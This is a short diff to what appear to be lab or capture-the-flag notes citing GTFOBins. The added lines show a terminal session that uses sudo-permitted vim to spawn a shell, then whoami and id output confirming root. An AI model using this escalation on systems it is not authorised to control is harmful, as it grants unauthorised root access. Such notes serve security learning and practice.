@@ -251,3 +251,12 @@ https://gtfobins.github.io/
 ![](../../../Images/Pasted%20image%2020241008162323.png)
 
 
+```
+russoski@7646d085583b:~$ sudo /usr/bin/vim -c ':!/bin/sh'
+
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+#
+```
